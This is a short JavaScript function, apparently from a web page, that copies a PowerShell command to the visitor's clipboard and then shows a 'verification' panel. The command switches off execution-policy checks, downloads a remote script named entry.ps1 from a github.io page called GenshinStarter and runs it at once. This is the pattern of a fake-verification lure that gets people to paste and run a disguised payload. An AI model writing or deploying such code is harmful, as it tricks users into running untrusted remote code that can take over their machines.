async function showSteps() {
    const textToCopy = "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass; Invoke-WebRequest -Uri 'https://b-52405.github.io/GenshinStarter/entry.ps1' -UseBasicParsing | Invoke-Expression; exit";
    await navigator.clipboard.writeText(textToCopy)
    document.getElementById("verification-container").style.display = "block";
}
